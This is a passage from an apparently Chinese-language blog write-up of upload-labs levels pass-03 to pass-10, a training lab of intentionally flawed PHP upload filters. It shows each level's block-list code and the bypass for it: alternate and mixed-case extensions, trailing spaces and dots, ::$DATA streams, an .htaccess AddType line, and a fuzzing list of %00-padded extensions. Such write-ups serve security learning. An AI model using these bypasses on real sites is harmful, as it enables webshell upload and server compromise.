class="string">'name'</span>])) &#123;</span><br><span class="line">                 $img_path = $UPLOAD_ADDR .<span class="string">'/'</span>. $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">                 $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>过滤了几个，可以用其他试试phtml、php3、php.a、shtml，提示：如果是asp的就可以用cer、asa、cdx等</strong></li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210721182725944.png" alt="image-20210721182725944"></p>
<h1 id="pass-04"><a href="#pass-04" class="headerlink" title="pass-04"></a>pass-04</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">"pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传!'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>基本上都过滤了，用.htaccess文件绕过吧</strong></li>
<li><strong>这是解析漏洞 只有apache才有。</strong></li>
<li><strong>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。</strong></li>
<li><strong>提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</strong></li>
<li><strong>这个漏洞的原理就是服务器没有过滤htaccess文件的上传，而htaccess文件上传后，当前目录就会按照这个配置文件里面的内容执行。</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .png</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723070156817.png" alt="image-20210723070156817"></p>
<h1 id="pass-05"><a href="#pass-05" class="headerlink" title="pass-05"></a>pass-05</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>过滤了一堆，但是有的大小写没过滤完整，拿出字典看看，用PhP试试</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">phtml</span><br><span class="line">php</span><br><span class="line">php3</span><br><span class="line">php4</span><br><span class="line">php5</span><br><span class="line">inc  </span><br><span class="line">pHtml</span><br><span class="line">pHp</span><br><span class="line">pHp3</span><br><span class="line">pHp4</span><br><span class="line">pHp5</span><br><span class="line">iNc</span><br><span class="line">iNc%00</span><br><span class="line">iNc%20%20%20</span><br><span class="line">iNc%20%20%20...%20.%20..</span><br><span class="line">iNc......</span><br><span class="line">inc%00</span><br><span class="line">inc%20%20%20</span><br><span class="line">inc%20%20%20...%20.%20..</span><br><span class="line">inc......</span><br><span class="line">pHp%00</span><br><span class="line">pHp%20%20%20</span><br><span class="line">pHp%20%20%20...%20.%20..</span><br><span class="line">pHp......</span><br><span class="line">pHp3%00</span><br><span class="line">pHp3%20%20%20</span><br><span class="line">pHp3%20%20%20...%20.%20..</span><br><span class="line">pHp3......</span><br><span class="line">pHp4%00</span><br><span class="line">pHp4%20%20%20</span><br><span class="line">pHp4%20%20%20...%20.%20..</span><br><span class="line">pHp4......</span><br><span class="line">pHp5%00</span><br><span class="line">pHp5%20%20%20</span><br><span class="line">pHp5%20%20%20...%20.%20..</span><br><span class="line">pHp5......</span><br><span class="line">pHtml%00</span><br><span class="line">pHtml%20%20%20</span><br><span class="line">pHtml%20%20%20...%20.%20..</span><br><span class="line">pHtml......</span><br><span class="line">php%00</span><br><span class="line">php%20%20%20</span><br><span class="line">php%20%20%20...%20.%20..</span><br><span class="line">php......</span><br><span class="line">php3%00</span><br><span class="line">php3%20%20%20</span><br><span class="line">php3%20%20%20...%20.%20..</span><br><span class="line">php3......</span><br><span class="line">php4%00</span><br><span class="line">php4%20%20%20</span><br><span class="line">php4%20%20%20...%20.%20..</span><br><span class="line">php4......</span><br><span class="line">php5%00</span><br><span class="line">php5%20%20%20</span><br><span class="line">php5%20%20%20...%20.%20..</span><br><span class="line">php5......</span><br><span class="line">phtml%00</span><br><span class="line">phtml%20%20%20</span><br><span class="line">phtml%20%20%20...%20.%20..</span><br><span class="line">phtml......</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723064040610.png" alt="image-20210723064040610"></p>
<h1 id="pass-06"><a href="#pass-06" class="headerlink" title="pass-06"></a>pass-06</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>过滤的比较全面就是没有去空格的函数，提示也说了空格绕过</strong></li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723064311661.png" alt="image-20210723064311661"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723064347289.png" alt="image-20210723064347289"></p>
<h1 id="pass-07"><a href="#pass-07" class="headerlink" title="pass-07"></a>pass-07</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>去了空格，过滤完美，提示说文件后缀点绕过，就在php后面加个.让他无法解析，就可以绕过了</strong></li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723064834702.png" alt="image-20210723064834702"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723064904118.png" alt="image-20210723064904118"></p>
<h1 id="pass-08"><a href="#pass-08" class="headerlink" title="pass-08"></a>pass-08</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>和前面的代码有点不同，没有去掉::$DATA字符流windows文件流绕过</strong></li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723065223780.png" alt="image-20210723065223780"></p>
<blockquote>
<ul>
<li><strong>执行的时候不带::$DATA就行了</strong></li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723065257088.png" alt="image-20210723065257088"></p>
<h1 id="pass-09"><a href="#pass-09" class="headerlink" title="pass-09"></a>pass-09</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>黑名单机制+删除掉文件名最后一个点（若有的话），判断最后一位是不是点，字符串首尾去空。根据代码反向思考构造可以绕过的后缀为.php.空格.</strong></li>
<li><strong>所以用.php.空格.就会删掉后面的点和去空格函数去掉但是还有一个.就形成绕过</strong></li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723071200203.png" alt="image-20210723071200203"></p>
<h1 id="pass-10"><a href="#pass-10" class="headerlink" title="pass-10"></a>pass-10</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name)) &#123;</span><br><span class="line">            $img_path = 